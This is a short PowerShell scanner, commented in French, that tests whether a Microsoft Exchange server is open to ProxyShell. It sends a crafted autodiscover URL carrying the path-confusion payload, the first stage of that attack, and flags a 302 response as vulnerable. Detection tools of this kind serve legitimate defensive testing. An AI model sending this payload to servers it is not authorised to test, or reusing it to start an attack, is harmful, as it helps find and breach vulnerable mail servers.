# ProxyShell.ps1 By RUSSO Lucas

Write-Host "L'url doit etre sous la forme : https://<site>/"
#Entrée utilisateur
$url = Read-Host "Renseigner l'url "
$parametre = "/autodiscover/autodiscover.json?@abc.com/owa/?&Email=autodiscover/autodiscover.json%3F@abc.com"

if ($url.Contains('https')) {
    #On crée la requete et bloque les redirections
    $HTTP_Request = [System.Net.WebRequest]::Create($url+$parametre)
    $HTTP_Request.AllowAutoRedirect = $false
    
    #on recuperer la reponse
    $HTTP_Response = $HTTP_Request.GetResponse()
    
    #On recupere le status HTTP dans une variable int
    $HTTP_Status = [int]$HTTP_Response.StatusCode
    
    if ($HTTP_Status -eq 302) {
        Write-Host "SERVEUR EXCAHNGE EST VULNERABLE"
    }else {
        Write-Host "NON VULNERABLE OU CE N'EST PAS UN SERVEUR EXCAHNGE"
    }

}else {
    Write-Host "L'url n'est pas sous la forme : https://<site>"
    Write-Host "https manquants"
}
